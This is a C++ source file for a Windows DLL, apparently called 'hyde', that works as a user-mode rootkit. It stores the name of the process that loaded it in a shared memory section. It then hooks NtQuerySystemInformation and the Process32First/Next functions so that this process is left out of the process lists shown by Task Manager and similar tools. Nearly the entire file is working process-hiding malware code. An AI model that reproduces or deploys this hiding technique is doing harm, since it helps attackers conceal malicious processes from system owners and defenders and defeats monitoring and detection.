// dllmain.cpp : Defines the entry point for the DLL application.
#include "stdafx.h"
#include "hyde.h"
#include "..\mhook-2.3\mhook-lib\mhook.h"
#include "winternl.h"

#pragma data_seg( ".ipc" )
	DWORD dwSet = 0;
	TCHAR szProcessToHideW[ (MAX_PATH*sizeof( wchar_t ))+sizeof( wchar_t ) ] = {'\0'};
	char szProcessToHideA[ MAX_PATH+1 ] = {'\0'};
#pragma data_seg()
#pragma comment( linker, "/section:.ipc,RWS" )

#define STATUS_SUCCESS  ( ( NTSTATUS )0x00000000L )

typedef struct SYSTEM_PROCESS_INFORMATION2
{
    ULONG                   NextEntryOffset;
    ULONG                   NumberOfThreads;
    LARGE_INTEGER           Reserved[3];
    LARGE_INTEGER           CreateTime;
    LARGE_INTEGER           UserTime;
    LARGE_INTEGER           KernelTime;
    UNICODE_STRING          ImageName;
    ULONG                   BasePriority;
    HANDLE                  ProcessId;
    HANDLE                  InheritedFromProcessId;
} SYSTEM_PROCESS_INFORMATION2, *PSYSTEM_PROCESS_INFORMATION2;

typedef NTSTATUS (WINAPI *PNT_QUERY_SYSTEM_INFORMATION)(SYSTEM_INFORMATION_CLASS SystemInformationClass,PVOID SystemInformation,ULONG SystemInformationLength,PULONG ReturnLength);
typedef BOOL (WINAPI *PHOOKEDPROCESS32FIRST)(HANDLE,LPPROCESSENTRY32);
typedef BOOL (WINAPI *PHOOKEDPROCESS32NEXT)(HANDLE,LPPROCESSENTRY32);
typedef BOOL (WINAPI *PHOOKEDPROCESS32FIRSTW)(HANDLE,LPPROCESSENTRY32);
typedef BOOL (WINAPI *PHOOKEDPROCESS32NEXTW)(HANDLE,LPPROCESSENTRY32);

BOOL WINAPI HookProcess32First(HANDLE,LPPROCESSENTRY32);
BOOL WINAPI HookProcess32Next(HANDLE,LPPROCESSENTRY32);
BOOL WINAPI HookProcess32FirstW(HANDLE,LPPROCESSENTRY32);
BOOL WINAPI HookProcess32NextW(HANDLE,LPPROCESSENTRY32);

PNT_QUERY_SYSTEM_INFORMATION OriginalNtQuerySystemInformation = NULL;
PHOOKEDPROCESS32FIRST OriginalProcess32First = NULL;
PHOOKEDPROCESS32NEXT OriginalProcess32Next = NULL;
PHOOKEDPROCESS32FIRSTW OriginalProcess32FirstW = NULL;
PHOOKEDPROCESS32NEXTW OriginalProcess32NextW = NULL;

NTSTATUS WINAPI HookedNtQuerySystemInformation( __in SYSTEM_INFORMATION_CLASS, __inout PVOID, __in ULONG, __out_opt PULONG );
HMODULE hModThisDll = NULL;

BOOL APIENTRY DllMain( HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved )
{
	wchar_t szParentProcessName[ MAX_PATH*sizeof( wchar_t ) ] = {'\0'};
	wchar_t szThisDll[ MAX_PATH*sizeof( wchar_t ) ] = {'\0'};
	HMODULE hMod = NULL;
	bool ret = TRUE;
	char* bBuf = new char[ MAX_PATH ];
	WCHAR* tok = NULL;
	int nCount = 0;

	switch ( ul_reason_for_call )
	{
	case DLL_PROCESS_ATTACH:
		GetModuleFileName( NULL,szParentProcessName,MAX_PATH );
		hMod = GetModuleHandle( szParentProcessName );
		if ( dwSet == 0 )
		{
			// Split up file path to get process name
			tok = wcsrchr(szParentProcessName, L'\\');
			if ( NULL != tok )
			{
				// Move passed the last '\'
				tok++;

				// Save wchar_t* of process name
				wcscat(szProcessToHideW,tok);

				// Convert process name to ASCII and store it
				WideCharToMultiByte( CP_ACP, 0, tok, -1, bBuf, MAX_PATH, NULL, NULL );
				strcat(szProcessToHideA,bBuf);

				// Signal 1st load is over
				dwSet = 1;
			}
		}
		else
		{
			// NtQuerySystemInformation
			OriginalNtQuerySystemInformation = ( PNT_QUERY_SYSTEM_INFORMATION)GetProcAddress( GetModuleHandle( L"ntdll.dll" ), "NtQuerySystemInformation" );
			if ( OriginalNtQuerySystemInformation )
			{
				Mhook_SetHook( ( PVOID* )&OriginalNtQuerySystemInformation, HookedNtQuerySystemInformation );
			}

			// Process32First
			OriginalProcess32First = (PHOOKEDPROCESS32FIRST)GetProcAddress(GetModuleHandle(L"Kernel32.dll"), "Process32First");
			if ( OriginalProcess32First )
			{
				Mhook_SetHook( ( PVOID* )&OriginalProcess32First, HookProcess32First );
			}

			// Process32Next
			OriginalProcess32Next = (PHOOKEDPROCESS32NEXT)GetProcAddress(GetModuleHandle(L"Kernel32.dll"), "Process32Next");
			if ( OriginalProcess32Next )
			{
				Mhook_SetHook( ( PVOID* )&OriginalProcess32Next, HookProcess32Next );
			}

			// Process32FirstW
			OriginalProcess32FirstW = (PHOOKEDPROCESS32FIRSTW)GetProcAddress(GetModuleHandle(L"Kernel32.dll"), "Process32FirstW");
			if ( OriginalProcess32FirstW )
			{
				Mhook_SetHook( ( PVOID* )&OriginalProcess32FirstW, HookProcess32FirstW );
			}

			// Process32NextW
			OriginalProcess32NextW = (PHOOKEDPROCESS32NEXTW)GetProcAddress(GetModuleHandle(L"Kernel32.dll"), "Process32NextW");
			if ( OriginalProcess32Next )
			{
				Mhook_SetHook( ( PVOID* )&OriginalProcess32NextW, HookProcess32NextW );
			}

			GetModuleFileName( NULL,szThisDll,MAX_PATH );
			hModThisDll = LoadLibrary( szThisDll ); // Increase ref. count
		}
		break;
	case DLL_THREAD_ATTACH:
		break;
	case DLL_THREAD_DETACH:
		break;
	case DLL_PROCESS_DETACH:
		if (Mhook_Unhook( ( PVOID* )&OriginalNtQuerySystemInformation ) &&
			Mhook_Unhook( ( PVOID* )&OriginalProcess32First ) &&
			Mhook_Unhook( ( PVOID* )&OriginalProcess32Next ) &&
			Mhook_Unhook( ( PVOID* )&OriginalProcess32FirstW ) &&
			Mhook_Unhook( ( PVOID* )&OriginalProcess32NextW) &&
			NULL != hModThisDll )
			FreeLibrary( hModThisDll ); // Only release dll if successfully unhooked, otherwise crashes are likely
		break;
	}
	return ret;
}

NTSTATUS WINAPI HookedNtQuerySystemInformation( __in SYSTEM_INFORMATION_CLASS SystemInformationClass, __inout PVOID SystemInformation, __in ULONG SystemInformationLength, __out_opt PULONG ReturnLength )
{
	std::wstring szHiddenProcess = L"";
    NTSTATUS status = OriginalNtQuerySystemInformation( SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);

	szHiddenProcess.append(szProcessToHideW);
	if ( szHiddenProcess.size() <= 0)
		return status;

    if ( SystemProcessInformation == SystemInformationClass && STATUS_SUCCESS == status )
    {
        PSYSTEM_PROCESS_INFORMATION2 pCurrent = NULL;
        PSYSTEM_PROCESS_INFORMATION2 pNext    = ( PSYSTEM_PROCESS_INFORMATION2 )SystemInformation;
        
        do
        {
            pCurrent = pNext;
            pNext    = ( PSYSTEM_PROCESS_INFORMATION2 )( ( PUCHAR )pCurrent + pCurrent->NextEntryOffset );

			if ( szHiddenProcess.find(pNext->ImageName.Buffer) != std::wstring::npos)
            {
                if ( 0 == pNext->NextEntryOffset )
                {
                    pCurrent->NextEntryOffset = 0;
                }
                else
                {
                    pCurrent->NextEntryOffset += pNext->NextEntryOffset;
                }

                pNext = pCurrent;
            }            
        } 
        while( pCurrent->NextEntryOffset != 0 );
    }

    return status;
}

BOOL WINAPI HookProcess32First(HANDLE hSnapshot,LPPROCESSENTRY32 lppe)
{
	std::string szHiddenProcess = "";

	szHiddenProcess.append(szProcessToHideA);
	if (szHiddenProcess.size() <= 0 )
		return OriginalProcess32First(hSnapshot,lppe);

	int ret = OriginalProcess32First(hSnapshot,lppe);
	if (ret)
	{
		if (szHiddenProcess.find((char*)lppe->szExeFile) != std::string::npos)
		{
			ret = OriginalProcess32Next(hSnapshot,lppe);
		}
	}
	return ret;
}

BOOL WINAPI HookProcess32Next(HANDLE hSnapshot,LPPROCESSENTRY32 lppe)
{
	std::string szHiddenProcess = "";

	szHiddenProcess.append(szProcessToHideA);
	if (szHiddenProcess.size() <= 0 )
		return OriginalProcess32First(hSnapshot,lppe);

	int ret = OriginalProcess32Next(hSnapshot,lppe);
	if (ret)
	{
		if (szHiddenProcess.find((char*)lppe->szExeFile) != std::string::npos)
		{
			ret = OriginalProcess32Next(hSnapshot,lppe);
		}
	}
	return ret;
}

BOOL WINAPI HookProcess32FirstW(HANDLE hSnapshot,LPPROCESSENTRY32 lppe)
{
	std::wstring szHiddenProcess = L"";

	szHiddenProcess.append(szProcessToHideW);
	if (szHiddenProcess.size() <= 0 )
		return OriginalProcess32FirstW(hSnapshot,lppe);

	int ret = OriginalProcess32FirstW(hSnapshot,lppe);
	if (ret)
	{
		if (szHiddenProcess.find(lppe->szExeFile) != std::wstring::npos)
		{
			ret = OriginalProcess32NextW(hSnapshot,lppe);
		}
	}
	return ret;
}

BOOL WINAPI HookProcess32NextW(HANDLE hSnapshot,LPPROCESSENTRY32 lppe)
{
	std::wstring szHiddenProcess = L"";

	szHiddenProcess.append(szProcessToHideW);
	if (szHiddenProcess.size() <= 0 )
		return OriginalProcess32FirstW(hSnapshot,lppe);

	int ret = OriginalProcess32NextW(hSnapshot,lppe);
	if (ret)
	{
		if (szHiddenProcess.find(lppe->szExeFile) != std::wstring::npos)
		{
			ret = OriginalProcess32NextW(hSnapshot,lppe);
		}
	}
	return ret;
}

